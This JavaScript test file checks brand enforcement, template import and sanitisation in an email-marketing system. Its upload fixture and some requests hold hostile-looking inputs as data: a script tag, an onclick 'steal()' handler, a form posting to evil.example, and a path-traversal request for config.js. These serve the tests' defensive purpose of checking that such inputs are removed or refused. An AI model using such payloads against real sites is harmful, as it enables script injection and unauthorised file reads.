/**
 * Email templates and the Soil Doctor brand.
 *
 * What must hold: every email TaskFlow sends is in the brand — its palette,
 * typeface, logo and footer — whatever the design asks for, whether it was
 * built here, copied from a starter or uploaded from another tool; uploads
 * keep their content but lose anything that runs; and starters cannot go out
 * with their example figures.
 */

import test, { before, after } from 'node:test';
import assert from 'node:assert/strict';

delete process.env.EMAIL_PROVIDER;

const { config } = await import('../src/config.js');
const { createApp } = await import('../src/app.js');
const { runMigrations } = await import('../src/db/migrate.js');
const { query, closePool } = await import('../src/db/pool.js');
const { hashPassword } = await import('../src/lib/password.js');
const { BRAND, PALETTE, brandifyHtml, hasEmoji, isBrandColor, nearestBrandColor } = await import('../src/lib/brand.js');
const { MERGE_TAGS, checkDesign, mergeTagsIn, renderEmail } = await import('../src/lib/emailRender.js');
const { cleanDesign, convertMergeTags, exportJson, fluidWidths, inlineCss, prepareHtml, prepareJson } = await import('../src/lib/emailImport.js');
const { STARTERS } = await import('../src/services/marketing/starters.js');

let server;
let baseUrl;
let available = true;
const tokens = {};

const call = async (method, path, { token, body, headers = {}, raw = false } = {}) => {
  const res = await fetch(`${baseUrl}/api/taskflow${path}`, {
    method,
    redirect: 'manual',
    headers: {
      ...(typeof body === 'string' || Buffer.isBuffer(body) ? {} : { 'content-type': 'application/json' }),
      ...(token ? { authorization: `Bearer ${token}` } : {}),
      ...headers,
    },
    body: body === undefined ? undefined : typeof body === 'string' || Buffer.isBuffer(body) ? body : JSON.stringify(body),
  });
  if (raw) return { status: res.status, buffer: Buffer.from(await res.arrayBuffer()), headers: res.headers };
  const text = await res.text();
  let parsed = null;
  try { parsed = text ? JSON.parse(text) : null; } catch { parsed = text; }
  return { status: res.status, body: parsed, headers: res.headers };
};
const skipIfUnavailable = (t) => {
  if (!available) { t.skip('no database'); return true; }
  return false;
};
const upload = (file, filename, token = tokens.mgr) => call('POST', `/marketing/templates/upload?filename=${encodeURIComponent(filename)}`, {
  token, body: file, headers: { 'content-type': 'application/octet-stream' },
});

const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
const hexesIn = (html) => [...html.matchAll(/(^|[^&\w/])#([0-9a-f]{6}|[0-9a-f]{3})\b/gi)].map((m) => `#${m[2]}`);
// the colours a sent email may contain: the brand's own
const offBrand = (html) => [...new Set(hexesIn(html).filter((c) => !isBrandColor(c)))];

// a template as Mailchimp exports it, with the habits of real ones
const MAILCHIMP = `<!doctype html>
<html><head><meta charset="UTF-8"><title>Spring offer for *|FNAME|*</title>
<style type="text/css">
  body { background:#fafafa; }
  #bodyTable { background-color:#fafafa; }
  .header { background:#ff6600; color:#ffffff; font-family:'Helvetica Neue', Arial, sans-serif; }
  .content p { color:#333333; font-size:16px; }
  .content .lead { color:#ff6600; }
  a.btn { background:#ff6600; color:#ffffff; padding:12px 20px; }
  a:hover { color:#000000; }
  @media only screen and (max-width:480px) { .content { padding:10px !important; } }
</style>
<script>alert('x')</script>
</head>
<body>
<span class="mcnPreviewText" style="display:none; font-size:0px; line-height:0px; max-height:0px; max-width:0px; opacity:0; overflow:hidden; visibility:hidden;">Thirty minutes that save two bags of urea</span>
<table id="bodyTable" width="600" style="width:600px"><tr><td class="header">Spring 2026 &#x1F33E;</td></tr>
<tr><td class="content"><p class="lead" style="font-weight:bold">Hello *|FNAME|*,</p><p>Book your test before sowing.</p>
<img src="data:image/png;base64,${PNG}" alt="field"><img src="images/local.png" alt="missing">
<a class="btn" href="https://soildoctor.in/book" onclick="steal()">Book now</a>
<form action="https://evil.example"><input name="x"></form>
<p>*|LIST:ADDRESS|* <a href="*|UNSUB|*">Unsubscribe</a> *|REWARDS|*</p></td></tr></table>
</body></html>`;

before(async () => {
  assert.match(config.db.schema, /test/, 'refusing to run outside a test schema');
  try {
    await query('SELECT 1');
  } catch {
    available = false;
    console.log('[tests] no database reachable — skipping email template API tests');
    return;
  }
  await query(`DROP SCHEMA IF EXISTS "${config.db.schema}" CASCADE`);
  await runMigrations({ verbose: false });
  await query(`INSERT INTO departments (key, name, color, position) VALUES ('MKT', 'Marketing', '#1f7a4d', 1)`);
  const department = (await query(`SELECT id FROM departments WHERE key = 'MKT'`)).rows[0].id;
  const password = await hashPassword('Password123!');
  for (const [name, email, role] of [['Admin', 'tpl-admin@test.local', 'admin'], ['Vartika Marketing', 'tpl-mgr@test.local', 'manager'], ['Team Member', 'tpl-member@test.local', 'member']]) {
    await query(
      `INSERT INTO users (full_name, email, password_hash, role, department_id, must_change_password) VALUES ($1,$2,$3,$4,$5,FALSE)`,
      [name, email, password, role, department],
    );
  }
  await new Promise((resolve) => {
    server = createApp().listen(0, () => { baseUrl = `http://127.0.0.1:${server.address().port}`; resolve(); });
  });
  for (const [key, email] of Object.entries({ admin: 'tpl-admin@test.local', mgr: 'tpl-mgr@test.local', member: 'tpl-member@test.local' })) {
    tokens[key] = (await call('POST', '/auth/login', { body: { email, password: 'Password123!' } })).body.token;
  }
});

after(async () => {
  if (server) await new Promise((resolve) => server.close(resolve));
  if (available) await query(`DROP SCHEMA IF EXISTS "${config.db.schema}" CASCADE`).catch(() => {});
  await closePool().catch(() => {});
});

// ================================================================ the brand

test('any colour moves to the nearest brand colour: greys to neutrals, colours to accents', () => {
  assert.equal(nearestBrandColor('#1f7a4d'), BRAND.forest);
  assert.equal(nearestBrandColor('#ff0000'), BRAND.soil);
  assert.equal(nearestBrandColor('#ffcc00'), BRAND.gold);
  assert.equal(nearestBrandColor('#666666'), BRAND.muted);
  assert.equal(nearestBrandColor('#eef2ee'), BRAND.sand);
  assert.equal(nearestBrandColor('not a colour', null), null);
  assert.ok(isBrandColor('#073f2a') && isBrandColor('#073F2A') && !isBrandColor('#073F2B'));
});

test('custom HTML is moved onto the brand: its main colour becomes Deep Green, fonts become Manrope', () => {
  const { html, report } = brandifyHtml(`<div style="color:#e94e1b;font-family:Comic Sans MS"><a style="background:#e94e1b;color:white">Go</a><span style="color:#2255cc">x</span><i style="color:rgba(255,0,0,0.5)">y</i><blockquote style="font-family:Georgia,serif">q</blockquote><p style="color:#073F2A">kept</p></div>`);
  assert.deepEqual(offBrand(html), []);
  assert.match(html, /color:#073F2A;font-family:Manrope/);
  assert.match(html, /background:#073F2A/);
  assert.match(html, /rgba\(139,94,59,0\.5\)/, 'transparency stays when the colour moves');
  assert.match(html, /font-family:'Source Serif 4'/, 'a serif face becomes the quote face');
  assert.match(html, /color:#073F2A">kept/);
  assert.equal(report.colors.find((c) => c.from === '#e94e1b').to, BRAND.deepGreen);
  assert.equal(report.fonts, 2);
  assert.equal(hasEmoji('© Soil Doctor™'), false);
  assert.equal(hasEmoji('Harvest time 🌾'), true);
  assert.equal(hasEmoji('Harvest time &#x1F33E;'), true);
  assert.equal(hasEmoji('Fish &amp; chips &#169;'), false);
});

test('the frame is always the brand’s: a design cannot choose its own colours, logo or header', () => {
  const design = {
    settings: { header: 'neon', ground: 'black', background: '#ff0000', brandColor: '#ff0000', logo: 'https://evil.example/logo.png' },
    blocks: [
      { type: 'hero', tone: 'purple', title: 'Hello {{first_name|there}}', button: { text: 'Go', href: 'https://soildoctor.in', style: 'red' } },
      { type: 'cards', items: [{ tag: 'New', tag_tone: 'pink', title: 'Card', text: 'Text' }] },
      { type: 'html', html: '<p style="color:#ff00ff">custom</p>' },
    ],
  };
  const { html, text } = renderEmail(design, {
    person: { first_name: 'Asha' }, data: { unsubscribe_url: 'https://x.test/u/1', preferences_url: 'https://x.test/p/1' },
    footer: { company: 'EkoSight', address: 'Noida' }, brand: { base: 'https://taskflow.example/m/brand' },
  });
  assert.deepEqual(offBrand(html), []);
  assert.doesNotMatch(html, /evil\.example/);
  assert.match(html, /https:\/\/taskflow\.example\/m\/brand\/lockup-ink\.png/, 'an unknown header style falls back to the light lockup');
  assert.match(html, /Turning soil data into farmer prosperity/);
  assert.match(html, /fonts\.googleapis\.com\/css2\?family=Manrope/);
  assert.match(html, /border-radius:999px/, 'buttons are pills');
  assert.match(html, /Hello Asha/);
  assert.match(text, /Unsubscribe: https:\/\/x\.test\/u\/1/);
});

test('the checks hold the brand rules: no emoji, no example figures, Deep Green never twice in a row', () => {
  const stats = { type: 'stats', example: true, items: [{ value: '62%', label: 'low zinc' }] };
  let c = checkDesign({ blocks: [stats] }, { subject: 'Rabi advisory' });
  assert.ok(c.problems.some((p) => /figures block still has the template’s example numbers/.test(p)));
  c = checkDesign({ blocks: [{ type: 'details', example: true, items: [{ label: 'Date', value: '14 Nov' }] }] }, { subject: 'Camp' });
  assert.ok(c.problems.some((p) => /details block/.test(p)));
  c = checkDesign({ blocks: [{ type: 'text', text: 'Happy Diwali 🪔' }] }, { subject: 'Greetings' });
  assert.ok(c.problems.some((p) => /no emoji/.test(p)));
  c = checkDesign({ blocks: [{ type: 'hero', tone: 'dark', title: 'A' }, { type: 'panel', title: 'B' }] }, { subject: 'S' });
  assert.ok(c.warnings.some((w) => /Two Deep Green sections/.test(w)));
  c = checkDesign({ blocks: [{ ...stats, example: false }] }, { subject: 'Rabi advisory' });
  assert.deepEqual(c.problems, []);
});

// ================================================================ the starters

test('every starter is in the brand, in English and Hindi, with only merge tags TaskFlow knows', () => {
  assert.ok(STARTERS.length >= 14);
  const keys = STARTERS.map((s) => s.key);
  assert.equal(new Set(keys).size, keys.length, 'keys are unique');
  // the automation recipes build on these
  for (const key of ['welcome', 'product', 'follow_up', 'festival', 'reengage']) assert.ok(keys.includes(key), key);
  for (const s of STARTERS) {
    assert.ok(s.subject?.en && s.subject?.hi, `${s.key} has a subject in both languages`);
    assert.ok(s.preheader?.en && s.preheader?.hi, `${s.key} has preview text in both languages`);
    assert.equal(hasEmoji(JSON.stringify(s)), false, `${s.key} has no emoji`);
    const tags = mergeTagsIn(JSON.stringify(s));
    for (const tag of tags) assert.ok(MERGE_TAGS.includes(tag), `${s.key} uses {{${tag}}}`);
    for (const lang of ['en', 'hi']) {
      const { html, text } = renderEmail(s.design, {
        lang, person: { first_name: 'Ramesh', organization: 'Kisan FPO', city: 'Sehore' }, data: { festival: 'Diwali', unsubscribe_url: 'https://x.test/u', preferences_url: 'https://x.test/p' },
        footer: { company: 'EkoSight', address: 'Noida' }, subject: s.subject[lang], preheader: s.preheader[lang],
      });
      assert.deepEqual(offBrand(html), [], `${s.key} (${lang}) uses only brand colours`);
      assert.doesNotMatch(html, /\{\{/, `${s.key} (${lang}) has no merge tag left over`);
      assert.ok(text.length > 40, `${s.key} (${lang}) has a plain-text version`);
      if (lang === 'hi') assert.match(html, /[ऀ-ॿ]/, `${s.key} has Hindi content`);
    }
    // example figures stop a starter going out as it is; with them replaced, nothing else does
    const check = checkDesign(s.design, { subject: s.subject.en, subjectHi: s.subject.hi, languages: ['en', 'hi'] });
    const exampleBlocks = s.design.blocks.filter((b) => b.example && ['stats', 'data', 'quote', 'details'].includes(b.type));
    assert.equal(check.problems.length > 0, exampleBlocks.length > 0, `${s.key}: ${check.problems.join('; ')}`);
    const real = { ...s.design, blocks: s.design.blocks.map(({ example, ...b }) => b) };
    assert.deepEqual(checkDesign(real, { subject: s.subject.en, subjectHi: s.subject.hi, languages: ['en', 'hi'] }).problems, [], s.key);
  }
});

// ================================================================ bringing templates in

test('other tools’ merge tags become TaskFlow’s; tags TaskFlow cannot fill are reported', () => {
  const r = convertMergeTags('*|FNAME|* *|UNSUB|* *|LIST:ADDRESS|* *|IF:REWARDS|*badge*|END:IF|* *|MMERGE7|* [firstname,fallback=friend] {{ contact.FIRSTNAME | default : "there" }} {{ unsubscribe_link }} {{ params.ORDER }} {{first_name}} {% if x %}');
  assert.match(r.html, /^\{\{first_name\}\} \{\{unsubscribe_url\}\}\s+\{\{first_name\|friend\}\} \{\{first_name\|there\}\} \{\{unsubscribe_url\}\} \{\{ params\.ORDER \}\} \{\{first_name\}\}/);
  assert.doesNotMatch(r.html, /badge|\*\||\{%/);
  assert.deepEqual(r.unknown.sort(), ['*|MMERGE7|*', '{{ params.ORDER }}'].sort());
  const cm = convertMergeTags('<unsubscribe>Leave</unsubscribe> <webversion>View online</webversion>');
  assert.equal(cm.html.trim(), '<a href="{{unsubscribe_url}}">Leave</a>');
});

test('style rules are written onto the elements they match, and the element’s own style still wins', () => {
  const { html, inlined, atRules, unsupported } = inlineCss(`<style>p{color:#111;margin:0} .box p{color:#222} #main .box p.lead{color:#333} a:hover{color:red} @media (max-width:400px){p{color:#444}}</style>
<div id="main"><div class="box"><p>a</p><p class="lead">b</p><p class="lead" style="color:#555">c</p></div></div><p>d</p>`);
  assert.match(html, /<p style="color:#222;margin:0">a<\/p>/);
  assert.match(html, /<p class="lead" style="color:#333;margin:0">b<\/p>/);
  assert.match(html, /style="color:#333;margin:0;color:#555">c/);
  assert.match(html, /<\/div><p style="color:#111;margin:0">d<\/p>/);
  assert.equal(inlined, 4);
  assert.equal(atRules, 1);
  assert.equal(unsupported, 1);
});

test('wide fixed layouts are allowed to shrink on phones', () => {
  const html = fluidWidths('<table width="600" style="min-width:600px;border:0"><tr><td width="120"><img src="x" width="560"></td></tr></table><div style="width:640px;padding:0">x</div>');
  assert.match(html, /<table width="100%" style="border:0;max-width:600px">/);
  assert.match(html, /<td width="120">/);
  assert.match(html, /<img src="x" width="100%" style="max-width:560px;height:auto">/);
  assert.match(html, /<div style="width:100%;padding:0;max-width:640px">/);
});

test('an uploaded HTML template keeps its content and loses anything that runs or is off-brand', () => {
  const r = prepareHtml(MAILCHIMP, { filename: 'spring-offer.html' });
  assert.equal(r.name, 'Spring offer', 'a title built around a merge tag gives way to the file name');
  assert.equal(prepareHtml('<title>Rabi advisory</title><p>x</p>', { filename: 'a.html' }).name, 'Rabi advisory');
  assert.equal(r.subject, 'Spring offer for {{first_name}}');
  assert.equal(r.preheader, 'Thirty minutes that save two bags of urea');
  assert.doesNotMatch(r.html, /<script|alert\(|onclick|<form|<input|<style|mcnPreviewText|\*\|/);
  assert.match(r.html, /Hello \{\{first_name\}\},/);
  assert.match(r.html, /href="\{\{unsubscribe_url\}\}"/);
  assert.deepEqual(offBrand(r.html), []);
  assert.match(r.html, /class="header" style="background:#073F2A;color:#ffffff;font-family:Manrope/, 'the template’s main colour became Deep Green, its font Manrope');
  assert.match(r.html, /<table id="bodyTable" width="100%" style="background-color:#FFFDF7;width:100%;max-width:600px">/);
  assert.equal(r.images.length, 1);
  assert.match(r.html, /src="tf-embedded-image-0"/);
  assert.equal(r.report.images.relative[0], 'images/local.png');
  assert.equal(r.report.emoji, true);
  const said = r.report.notes.map((n) => n.text).join('\n');
  assert.match(said, /Styles were written onto/);
  assert.match(said, /moved onto the Soil Doctor palette/);
  assert.match(said, /Merge tags converted/);
  assert.match(said, /were removed; mail apps do not run them/, 'three things that run (script, onclick-free form and input) are counted');
  assert.match(said, /emoji/);
  assert.match(said, /images\/local\.png/);
});

test('a TaskFlow export comes back as the same design; unknown sections are left out and said so', () => {
  const design = { settings: { header: 'dark', ground: 'paper' }, blocks: [{ type: 'hero', tone: 'sand', title: { en: 'Hi', hi: 'नमस्ते' } }, { type: 'pulse' }] };
  const file = JSON.stringify(exportJson({ name: 'Mine', category: 'ADVISORY', description: 'd', subject: { en: 'S', hi: 'स' }, preheader: null, design }));
  const back = prepareJson(file);
  assert.deepEqual(back.design, design);
  assert.equal(back.name, 'Mine');
  assert.deepEqual(back.subject, { en: 'S', hi: 'स' });
  const odd = prepareJson(JSON.stringify({ settings: { header: 'x', brandColor: '#f00' }, blocks: [{ type: 'video' }, { type: 'text', text: 'ok' }, { type: 'html', html: '<b style="color:#ff0000" onclick="x()">r</b>' }] }));
  assert.deepEqual(odd.design.settings, { header: 'light', ground: 'sand' });
  assert.deepEqual(odd.design.blocks.map((b) => b.type), ['text', 'html']);
  // its one colour is its main colour, so it becomes Deep Green
  assert.equal(odd.design.blocks[1].html, '<b style="color:#073F2A">r</b>');
  assert.match(odd.report.notes.map((n) => n.text).join(' '), /Left out sections TaskFlow does not know: video/);
  assert.throws(() => prepareJson('{nope'), /not valid JSON/);
  assert.throws(() => cleanDesign({ blocks: [{ type: 'video' }] }, { strict: true }), /Unknown section type: video/);
});

// ================================================================ the API

test('the template list carries every starter with its subject, preview text and example count', async (t) => {
  if (skipIfUnavailable(t)) return;
  const res = await call('GET', '/marketing/templates', { token: tokens.mgr });
  assert.equal(res.status, 200);
  assert.equal(res.body.starters.length, STARTERS.length);
  const advisory = res.body.starters.find((s) => s.key === 'season_advisory');
  assert.equal(advisory.subject.en, 'Sow with the right dose this Rabi');
  assert.ok(advisory.examples >= 1);
  assert.ok(res.body.categories.ADVISORY);
  const meta = await call('GET', '/marketing/meta', { token: tokens.mgr });
  assert.deepEqual(meta.body.design_options.header, ['light', 'dark', 'minimal']);
});

test('a starter is copied to change freely; edits, export and re-upload keep it whole', async (t) => {
  if (skipIfUnavailable(t)) return;
  const copied = await call('POST', '/marketing/templates/starters/report_ready/copy', { token: tokens.mgr, body: { name: 'Report ready (Sehore)' } });
  assert.equal(copied.status, 201, JSON.stringify(copied.body));
  const tpl = copied.body.template;
  assert.equal(tpl.source, 'starter:report_ready');
  assert.equal(tpl.subject.en, 'Your soil report is ready, {{first_name|friend}}');
  const changed = await call('PATCH', `/marketing/templates/${tpl.id}`, { token: tokens.mgr, body: { subject: { en: 'Your report, {{first_name|friend}}', hi: 'आपकी रिपोर्ट' }, preheader: 'Dose card inside' } });
  assert.equal(changed.status, 200);
  assert.deepEqual(changed.body.template.preheader, { en: 'Dose card inside', hi: '' });
  assert.deepEqual(changed.body.template.design, tpl.design, 'a change to the subject leaves the design as it was');

  const exported = await call('GET', `/marketing/templates/${tpl.id}/export`, { token: tokens.mgr });
  assert.equal(exported.status, 200);
  assert.match(exported.headers.get('content-disposition'), /attachment; filename="report-ready-sehore\.json"/);
  assert.equal(exported.body.format, 'taskflow.email-template');

  const again = await upload(JSON.stringify(exported.body), 'report-ready-sehore.json');
  assert.equal(again.status, 201, JSON.stringify(again.body));
  assert.equal(again.body.template.source, 'upload:json');
  assert.deepEqual(again.body.template.design, tpl.design);
  assert.equal(again.body.template.subject.en, 'Your report, {{first_name|friend}}');

  const starterFile = await call('GET', '/marketing/templates/starters/festival/export', { token: tokens.mgr });
  assert.equal(starterFile.status, 200);
  assert.equal(starterFile.body.template.name, 'Festival greeting');
});

test('an uploaded HTML file becomes a template with its images hosted and a report of what changed', async (t) => {
  if (skipIfUnavailable(t)) return;
  const res = await upload(MAILCHIMP, 'spring-offer.html');
  assert.equal(res.status, 201, JSON.stringify(res.body));
  const { template, report } = res.body;
  assert.equal(template.source, 'upload:html');
  assert.equal(template.preheader.en, 'Thirty minutes that save two bags of urea');
  assert.equal(template.design.blocks.length, 1);
  assert.equal(template.design.blocks[0].type, 'html');
  assert.ok(report.notes.length > 3);
  const hosted = template.design.blocks[0].html.match(/src="([^"]+\/m\/a\/[^"]+)"/);
  assert.ok(hosted, 'the embedded image is hosted');
  const image = await call('GET', new URL(hosted[1]).pathname.replace('/api/taskflow', ''), { raw: true });
  assert.equal(image.status, 200);
  assert.equal(image.headers.get('content-type'), 'image/png');

  // what goes out is in the brand, with the brand's header and footer around it
  const preview = await call('GET', `/marketing/templates/${template.id}/preview`, { token: tokens.mgr });
  assert.equal(preview.status, 200);
  assert.deepEqual(offBrand(preview.body.html), []);
  assert.match(preview.body.html, /brand\/mark-96\.png/);
  assert.match(preview.body.html, /Hello Ramesh,/);
  assert.match(preview.body.html, /Turning soil data into farmer prosperity/);
});

test('uploads need the manage permission and a real template', async (t) => {
  if (skipIfUnavailable(t)) return;
  assert.equal((await upload(MAILCHIMP, 'x.html', tokens.member)).status, 403);
  assert.equal((await upload('', 'x.html')).status, 400);
  const plain = await upload('just some words', 'notes.txt');
  assert.equal(plain.status, 400);
  assert.match(plain.body.error?.message || plain.body.message || JSON.stringify(plain.body), /Upload an HTML file/);
  assert.equal((await upload('{"blocks":[{"type":"video"}]}', 'x.json')).status, 400);
  const bad = await call('POST', '/marketing/templates', { token: tokens.mgr, body: { name: 'X', design: { blocks: [{ type: 'video' }] } } });
  assert.equal(bad.status, 400);
});

test('starter previews and the design check answer for the designer', async (t) => {
  if (skipIfUnavailable(t)) return;
  assert.equal((await call('GET', '/marketing/templates/starters/season_advisory/preview', { token: tokens.member })).status, 403, 'people outside marketing see nothing');
  const en = await call('GET', '/marketing/templates/starters/season_advisory/preview', { token: tokens.mgr });
  assert.equal(en.status, 200);
  assert.match(en.body.html, /Sow with the right dose this Rabi/);
  assert.match(en.body.html, /lockup-ink\.png/);
  const hi = await call('GET', '/marketing/templates/starters/season_advisory/preview?lang=hi', { token: tokens.mgr });
  assert.match(hi.body.html, /इस रबी सही मात्रा से बुवाई करें/);
  assert.equal((await call('GET', '/marketing/templates/starters/nope/preview', { token: tokens.mgr })).status, 404);

  const starter = STARTERS.find((s) => s.key === 'impact_story');
  const check = await call('POST', '/marketing/design-check', { token: tokens.mgr, body: { design: starter.design } });
  assert.equal(check.status, 200);
  assert.ok(check.body.problems.some((p) => /testimonial block/.test(p)));
  assert.ok(check.body.warnings.some((w) => /No subject line yet/.test(w)));
  assert.ok(!check.body.problems.includes('The subject line is empty'));
});

test('the brand images are served to mail apps, and nothing else from that folder', async (t) => {
  if (skipIfUnavailable(t)) return;
  const logo = await call('GET', '/m/brand/lockup-ink.png', { raw: true });
  assert.equal(logo.status, 200);
  assert.equal(logo.headers.get('content-type'), 'image/png');
  assert.equal(logo.buffer.subarray(1, 4).toString('ascii'), 'PNG');
  assert.equal((await call('GET', '/m/brand/secret.txt', { raw: true })).status, 404);
  assert.equal((await call('GET', '/m/brand/..%2F..%2Fconfig.js', { raw: true })).status, 404);
});

test('the pages people reach from an email are in the brand too', async (t) => {
  if (skipIfUnavailable(t)) return;
  const res = await fetch(`${baseUrl}/api/taskflow/m/u/${'x'.repeat(30)}`);
  const html = await res.text();
  assert.match(html, /lockup-ink\.png/);
  assert.match(html, /Turning soil data into farmer prosperity/);
  assert.match(res.headers.get('content-security-policy'), /font-src https:\/\/fonts\.gstatic\.com/);
  assert.doesNotMatch(res.headers.get('content-security-policy'), /script-src/);
  assert.deepEqual(offBrand(html.replace(/--strata:[^;]+;/, '')), []);
});

test('migration 026 only adds nullable columns', async () => {
  const fs = await import('node:fs');
  const sql = fs.readFileSync(new URL('../src/db/migrations/026_marketing_templates.sql', import.meta.url), 'utf8');
  const statements = sql.split('\n').filter((l) => l.trim() && !l.trim().startsWith('--'));
  assert.ok(statements.length > 0);
  for (const line of statements) assert.match(line, /^ALTER TABLE mkt_templates ADD COLUMN IF NOT EXISTS \w+\s+(JSONB|TEXT);$/);
});
